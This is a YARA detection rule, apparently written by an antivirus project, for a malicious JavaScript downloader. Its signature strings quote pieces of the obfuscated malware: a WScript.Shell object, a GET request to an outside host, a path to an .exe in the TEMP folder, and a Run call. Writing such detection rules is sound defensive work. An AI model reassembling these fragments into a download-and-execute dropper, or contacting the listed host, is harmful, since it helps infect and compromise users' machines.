rule sig_20160330_8dcb7be2ae16a3b805f8430e0aa44d08 {
  meta:
    description = "datamaliciousorder - file 20160330_8dcb7be2ae16a3b805f8430e0aa44d08.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "08e9ca7308d9526095f6d189e331753bbb6b728a68a288d25b925fd9c011a1b1"

  strings:
    $s1  = "var _D = function _NQ() {return WScript[_GL](\"WScript\"+\".Shell\");}(), _IM = 11;" fullword ascii
    $s2  = "function _ZZ(_KD, _EZ){_GA = _GA * 1; return _KD - _EZ;};" fullword ascii
    $s3  = "_RR[_ZO](\"GET\", \"http://ihlasauracleanmax.co/j3dlad\", false);" fullword ascii
    $s4  = "if (_RR[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _EM(){return _V + \"\";};" fullword ascii
    $s6  = "function _GT() {return _D[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YAlUrwka9BLjy9A6.ex\" + \"e\";};" fullword ascii
    $s7  = "function _C(_O){_D[\"Run\"](_O, _GA, _GA);};" fullword ascii
    $s8  = "function _N() {return ((_RX == true) && (_RX == _M)) ? 1 : _GA;};" fullword ascii
    $s9  = "var _CS = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_VW){" fullword ascii
    $s11 = "function _U(_UV) {var _T = (1, 2, 3, 4, 5, _UV); return _T;};" fullword ascii
    $s12 = "function _EE()" fullword ascii
    $s13 = "function _KT(){return 22;};" fullword ascii
    $s14 = "function _KB(){return _GL;};" fullword ascii
    $s15 = "return _ZZ(_QW, _G);" fullword ascii
    $s16 = "_M = true; " fullword ascii
    $s17 = "var _M = false;" fullword ascii
    $s18 = "var _Q0 = false;" fullword ascii
    $s19 = "var _RX = false;" fullword ascii
    $s20 = "_RX = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}